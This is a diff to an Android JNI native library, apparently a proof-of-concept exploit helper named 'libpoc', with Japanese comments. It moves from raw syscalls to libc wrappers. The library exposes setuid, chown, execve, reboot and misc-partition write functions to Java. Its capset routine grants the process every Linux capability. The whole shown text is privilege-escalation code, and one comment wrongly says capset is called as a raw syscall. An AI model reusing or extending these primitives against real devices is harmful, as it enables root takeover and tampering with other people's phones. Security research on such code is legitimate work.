@@ -6,29 +6,23 @@
 #include <fcntl.h>
 #include <string.h>
 #include <sys/stat.h>
-#include <sys/syscall.h>
+#include <sys/reboot.h>
 #include <sys/capability.h>
-#include <linux/reboot.h>
 #include <android/log.h>
 
 #define LOG_TAG "libpoc"
 #define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
 
-static int syscall_ret(int ret) {
-    if (ret < 0) return -errno;
-    return ret;
-}
-
 JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1setuid(JNIEnv *env, jclass clazz, jint uid) {
-    int ret = syscall(__NR_setuid, uid);
-    return syscall_ret(ret);
+    int ret = setuid(uid);
+    return ret == 0 ? 0 : -errno;
 }
 
 JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1chown(JNIEnv *env, jclass clazz, jstring path, jint uid, jint gid) {
     const char *cpath = (*env)->GetStringUTFChars(env, path, NULL);
-    int ret = syscall(__NR_chown, cpath, uid, gid);
+    int ret = chown(cpath, uid, gid);
     (*env)->ReleaseStringUTFChars(env, path, cpath);
-    return syscall_ret(ret);
+    return ret == 0 ? 0 : -errno;
 }
 
 JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1write_1misc(JNIEnv *env, jclass clazz, jstring cmd) {
@@ -85,23 +79,27 @@ JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1execve(JNIEnv *env, jclass 
     int ret = execve(ccmd, argv, NULL);
     free(argv);
     (*env)->ReleaseStringUTFChars(env, cmd, ccmd);
-    return syscall_ret(ret);
+    return ret == 0 ? 0 : -errno;
 }
 
 JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1reboot_1syscall(JNIEnv *env, jclass clazz, jint magic, jint magic2, jint cmd) {
-    int ret = syscall(__NR_reboot, magic, magic2, cmd);
-    return syscall_ret(ret);
+    // reboot() 関数は libc のラッパー。cmd には LINUX_REBOOT_CMD_* を指定
+    int ret = reboot(cmd);
+    return ret == 0 ? 0 : -errno;
 }
 
 JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1capset(JNIEnv *env, jclass clazz) {
+    // capset システムコールを直接呼ぶ (__NR_capset は bionic で定義されている)
     struct __user_cap_header_struct header = { _LINUX_CAPABILITY_VERSION_3, 0 };
-    struct __user_cap_data_struct data[2] = { {0, 0, 0}, {0, 0, 0} };
-    int ret = syscall(__NR_capget, &header, data);
+    struct __user_cap_data_struct data[2];
+    // まず現在のケイパビリティを取得
+    int ret = capget(&header, data);
     if (ret < 0) return -errno;
+    // 全ケイパビリティを許可・実効に設定
     data[0].permitted = data[0].effective = 0xffffffff;
     data[1].permitted = data[1].effective = 0xffffffff;
-    ret = syscall(__NR_capset, &header, data);
-    return syscall_ret(ret);
+    ret = capset(&header, data);
+    return ret == 0 ? 0 : -errno;
 }
 
 JNIEXPORT jint JNICALL Java_com_poc_Receiver_native_1open_1write(JNIEnv *env, jclass clazz, jstring path, jstring data) {
